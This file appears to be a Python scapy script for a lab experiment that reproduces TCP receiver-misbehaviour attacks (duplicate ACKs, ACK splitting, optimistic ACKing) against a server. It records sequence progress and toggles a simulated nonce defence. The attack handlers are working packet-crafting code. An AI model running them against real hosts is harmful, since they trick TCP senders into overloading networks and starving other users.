#! /usr/bin/env python
from scapy.all import *
import random
import sys
import numpy as np
import subprocess as sp
import threading

### Global variable definitions.
#########################################
IP_DST = sys.argv[2]
DST_PORT =  int(sys.argv[3])
FIX = int(sys.argv[4]) # 0 = no, 1 = yes
client_nonce = 0
server_nonce = 0

SRC_PORT = random.randint(1024,65535)
data = list()
File = sys.argv[1]
if (FIX and (File == 'op' or File == 'normal')):
  File += '_fix'
FileName = "npy/%s.npy" % File

## For Opt attack specifically.
MTU = 1472 # Default for TCP
WAIT_TIME = 0.4
curr_ACK = 0  # For OPT
curr_SEQ = 0  # For OPT
count_SEQ = 0 # For DUP
MAX_SIZE = 200000

## Defined across all tranmission types.
socket = conf.L2socket(iface="client-eth0")

syn = IP(dst=IP_DST) / TCP(window=65535, sport=SRC_PORT, dport=DST_PORT, flags='S')
IP_SRC = syn[IP].src
SRC_PORT = syn[TCP].sport

#### Sending SYN
syn_ack = sr1(syn)
initialTs = syn_ack.time
initialSeq = syn_ack[TCP].seq
count_SEQ = initialSeq

### Sending response after SYN_ACK
getStr = 'GET / HTTP/1.1\r\n\r\n'
request = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
                 seq=(syn_ack[TCP].ack), ack=(syn_ack[TCP].seq + 1), flags='FA') / getStr
socket.send(Ether() / request)




### Global method definitions.
##########################################
### Send ACK with sequence no seq and ack num ack.
## Nonce logic invokes as layer beween client and server.
def send_ACK(seq, ack):
  global client_nonce, server_nonce
  if((not FIX) or (FIX and (client_nonce == server_nonce))):
    ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
             seq=seq, ack=ack, flags='A')
    socket.send(Ether() / ack_pkt)

### Send ACK with normal sequence progression.
def send_ACK_in_seq(pkt):
  send_ACK(pkt[TCP].ack, pkt[TCP].seq + data_len(pkt))


### Function to send ACK used in opt.
## Assume no access to server-generated nonce here.
def send_ACK_opt():
  global curr_ACK
  while (((curr_ACK - initialSeq) < MAX_SIZE) and ((not FIX) or (FIX and (client_nonce == server_nonce)))):
    curr_ACK += MTU
    ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
             seq=curr_SEQ, ack=curr_ACK, flags='A')
    socket.send(Ether() / ack_pkt)

## Split ACK across several packets
def get_split_acks(pkt):
  tcp_seg_len = data_len(pkt)
  ACK_delta = tcp_seg_len / 3 # use 3 for now
  nextACK_num = pkt[TCP].seq + tcp_seg_len
  ACK_nums = list()
  if ACK_delta != 0:
    ACK_nums = range(pkt[TCP].seq + ACK_delta, nextACK_num, ACK_delta)
  if nextACK_num not in ACK_nums:
    ACK_nums.append(nextACK_num);
  return ACK_nums

### Append new data point.
def append(pkt):
  data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))

### Function to check the formatting of packet.
def check_pkt(pkt):
  return (IP not in pkt) or (TCP not in pkt) or (pkt[IP].src != IP_DST) or (pkt[TCP].sport != DST_PORT)

### Calculate length of TCP data segment.
def data_len(pkt):
  ip_len = pkt.getlayer(IP).len
  ip_head_len = pkt.getlayer(IP).ihl * 32 / 8
  tcp_head_len = pkt.getlayer(TCP).dataofs * 32 / 8
  return ip_len - ip_head_len - tcp_head_len



### Proper handling for packet with normal transmission.
#########################################################
def normal(pkt):
  global client_nonce, server_nonce
  if (check_pkt(pkt)):
    return
  append(pkt)
  send_ACK_in_seq(pkt)
  ## Assume this is received from the server.
  randy = random.randint(1,1000)
  server_nonce +=randy
  # Nonce also added onto client because we can access it.
  client_nonce +=randy



### Proper handling for packet with DUP attack.
#########################################################
def dup(pkt):
  if (check_pkt(pkt)):
    return
  append(pkt)

  for i in xrange(3):
    send_ACK_in_seq(pkt)



### Proper handling for packet with SPLIT attack.
#########################################################
def split(pkt) :
  if (check_pkt(pkt)):
    return
  append(pkt)
  
  for ACK_num in get_split_acks(pkt):
    send_ACK(pkt[TCP].ack, ACK_num)



### Proper handling for OP attacks.
#########################################################
def op(pkt):
  global client_nonce, server_nonce
  if (check_pkt(pkt)):
    return
  append(pkt)
  # Assume this is received from server, but ignored.
  server_nonce += random.randint(1,1000)
  # ACKs being send optimistically, not in response.

## Special timing stuff for op attack.
if sys.argv[1] == 'op':
  curr_ACK = syn_ack[TCP].seq + 1
  curr_SEQ = syn_ack[TCP].ack + len(getStr) + 1
  t = threading.Timer(WAIT_TIME, send_ACK_opt)
  t.start()




### Choose proper ACK handling given attack type.
#########################################################
if sys.argv[1] == "normal" :
    sniff(iface="client-eth0", prn=normal, filter="tcp and ip", timeout=4)
if sys.argv[1] == "dup":
    sniff(iface="client-eth0", prn=dup, filter="tcp and ip", timeout=4)
if sys.argv[1] == "op":
    sniff(iface="client-eth0", prn=op, filter="tcp and ip", timeout=4)
if sys.argv[1] == "split" :
    sniff(iface="client-eth0", prn=split, filter="tcp and ip", timeout=4)


### Write data out to proper file.
#########################################################
numbas = np.asarray(zip(*data))
sp.call(["rm", "-f", FileName], shell=True)
np.save(FileName, numbas)
